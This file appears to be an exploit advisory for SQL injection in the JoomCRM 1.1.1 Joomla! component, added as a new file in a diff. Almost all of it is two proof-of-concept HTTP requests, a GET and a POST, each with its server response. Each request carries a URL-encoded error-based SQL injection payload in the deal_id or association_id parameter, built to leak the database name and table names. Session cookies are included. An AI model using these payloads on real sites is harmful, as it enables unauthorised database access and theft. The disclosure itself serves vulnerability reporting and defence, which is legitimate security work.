@@ -1,0 +1,63 @@
+# Exploit Title: Joomla! Component JoomCRM 1.1.1 - SQL Injection
+# Dork: N/A
+# Date: 2019-01-11
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://joomboost.com/
+# Software Link: https://extensions.joomla.org/extensions/extension/marketing/crm/joomcrm/
+# Version: 1.1.1
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1) 
+# http://localhost/[PATH]/index.php?option=com_joomcrm&view=contacts&format=raw&loc=deal&tmpl=component&deal_id=[SQL]
+# 
+
+GET /[PATH]/index.php?option=com_joomcrm&view=contacts&format=raw&loc=deal&tmpl=component&deal_id=31%39%20A%4e%44%28%53%45%4c%45%43%54%20%31%20%46%52OM%20%28%53%45%4c%45%43%54%20%43%4f%55%4e%54%28%2a%29%2c%43%4f%4e%43%41T%28%28%53%45%4c%45%43%54%28%53%45%4c%45%43%54%20%43%4f%4e%43%41%54%28%43%41%53%54%28%44%41%54%41%42%41%53E()%20%41%53%20%43%48%41%52%29%2c%30%78%37%65%29%29%20%46%52%4f%4d%20%49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%54%41%42%4c%45%53%20%57%48%45%52%45%20%74%61%62%6c%65%5f%73%63%68%65%6d%61%3dDAT%41%42%41%53%45%28%29%20%4c%49%4d%49%54%20%30%2c%31%29%2c%46%4c%4f%4f%52%28%52%41%4e%44%28%30%29%2a%32%29%29%78%20%46%52%4f%4d%20%49%4e%46%4fRMA%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%54%41%42%4c%45%53%20%47%52%4f%55%50%20%42%59%20%78%29%61%29 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: __cfduid=d32095db21c106516d53cae46d08e3e291547158024; 5cccc826c28cb27e67933089ce2566a0=1ad52e59a11808d25fa5e93d022c74f3; joomla_user_state=logged_in
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+HTTP/1.1 500 Internal Server Error
+Date: Thu, 10 Jan 2019 22:19:34 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/7.1.18
+Alt-Svc: h2=":443"; ma=60
+Server: cloudflare
+CF-RAY: 4972869f86167a82-LAX
+
+# POC: 
+# 2) 
+# http://localhost/[PATH]/index.php?option=com_joomcrm&view=events&layout=event_listings&format=raw&tmpl=component
+# 
+
+POST /[PATH]/index.php?option=com_joomcrm&view=events&layout=event_listings&format=raw&tmpl=component HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 758
+Cookie: __cfduid=d32095db21c106516d53cae46d08e3e291547158024; 5cccc826c28cb27e67933089ce2566a0=1ad52e59a11808d25fa5e93d022c74f3; joomla_user_state=logged_in
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+assignee_id=1&assignee_filter_type=individual&association_type=deal&association_id=47%39%20A%4e%44%28%53%45%4c%45%43%54%20%31%20%46%52OM%20%28%53%45%4c%45%43%54%20%43%4f%55%4e%54%28%2a%29%2c%43%4f%4e%43%41T%28%28%53%45%4c%45%43%54%28%53%45%4c%45%43%54%20%43%4f%4e%43%41%54%28%43%41%53%54%28%44%41%54%41%42%41%53E()%20%41%53%20%43%48%41%52%29%2c%30%78%37%65%29%29%20%46%52%4f%4d%20%49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%54%41%42%4c%45%53%20%57%48%45%52%45%20%74%61%62%6c%65%5f%73%63%68%65%6d%61%3dDAT%41%42%41%53%45%28%29%20%4c%49%4d%49%54%20%30%2c%31%29%2c%46%4c%4f%4f%52%28%52%41%4e%44%28%30%29%2a%32%29%29%78%20%46%52%4f%4d%20%49%4e%46%4fRMA%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%54%41%42%4c%45%53%20%47%52%4f%55%50%20%42%59%20%78%29%61%29: undefined
+HTTP/1.1 500 Internal Server Error
+Date: Thu, 10 Jan 2019 22:21:40 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/7.1.18
+Alt-Svc: h2=":443"; ma=60
+Server: cloudflare
+CF-RAY: 497289b65710775a-LAX
